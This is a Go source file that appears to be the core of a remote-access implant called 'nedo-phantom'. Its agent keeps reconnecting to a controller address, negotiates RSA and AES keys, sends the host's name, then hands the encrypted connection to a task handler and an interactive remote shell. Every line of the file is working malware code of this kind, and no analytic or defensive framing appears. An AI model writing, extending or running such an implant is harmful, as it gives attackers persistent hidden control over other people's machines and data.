package core

import (
    "encoding/binary"
    "fmt"
    "net"
    "os"
    "time"

    "nedo-phantom/internal/agent/crypto"
    "nedo-phantom/internal/agent/modules"
    "nedo-phantom/internal/agent/tasks"
    "nedo-phantom/internal/common"
)

type Agent struct {
    serverAddr     string
    conn           net.Conn
    hostname       string
    crypto         *crypto.Crypto
    moduleManager  *modules.ModuleManager
}

func NewAgent(serverAddr string) *Agent {
    hostname, _ := os.Hostname()
    return &Agent{
        serverAddr:    serverAddr,
        hostname:      hostname,
        moduleManager: modules.NewModuleManager(),
    }
}

func (a *Agent) Run() {
    for {
        if err := a.connect(); err != nil {
            fmt.Printf("[!] Connection error: %v, retry in 10s\n", err)
            time.Sleep(10 * time.Second)
            continue
        }

        a.handleConnection()
        a.conn.Close()
        time.Sleep(5 * time.Second)
    }
}

func (a *Agent) connect() error {
    conn, err := net.Dial("tcp", a.serverAddr)
    if err != nil {
        return err
    }
    a.conn = conn
    return nil
}

func (a *Agent) handleConnection() {
    var err error
    a.crypto, err = crypto.NewCrypto()
    if err != nil {
        fmt.Printf("[-] Failed to create crypto: %v\n", err)
        return
    }
    fmt.Println("[+] RSA key pair generated")

    pem, err := a.crypto.GetPublicKeyPEM()
    if err != nil {
        fmt.Printf("[-] Failed to get public key PEM: %v\n", err)
        return
    }

    if _, err := a.conn.Write([]byte("KEY:" + pem + "\n")); err != nil {
        fmt.Printf("[-] Failed to send public key: %v\n", err)
    }
    fmt.Println("[+] Public key sent to server")

    lengthBuf := make([]byte, 4)
    if _, err := a.conn.Read(lengthBuf); err != nil {
        fmt.Printf("[-] Failed to read key length: %v\n", err)
        return
    }
    keyLength := binary.BigEndian.Uint32(lengthBuf)

    encryptedKey := make([]byte, keyLength)
    if _, err := a.conn.Read(encryptedKey); err != nil {
        fmt.Printf("[-] Failed to read encrypted key: %v\n", err)
        return
    }
    fmt.Printf("[+] Received encrypted AES key (%d bytes)\n", keyLength)

    if err := a.crypto.SetSymmetricKey(encryptedKey); err != nil {
        fmt.Printf("[-] Failed to decrypt AES key: %v\n", err)
        return
    }
    fmt.Println("[+] AES key decrypted successfully")

    secureConn := common.NewSecureConn(a.conn, a.crypto)
    fmt.Println("[+] Secure connection established")

    if _, err := secureConn.Write([]byte(a.hostname + "\n")); err != nil {
        fmt.Printf("[-] Failed to send hostname: %v\n", err)
        return
    }
    fmt.Printf("[+] Hostname '%s' sent securely\n", a.hostname)

    go func() {
        handler := tasks.NewTaskHandler(secureConn, a.moduleManager)
        handler.Run()
    }()

    shell := NewShell(secureConn)
    shell.Run()
}
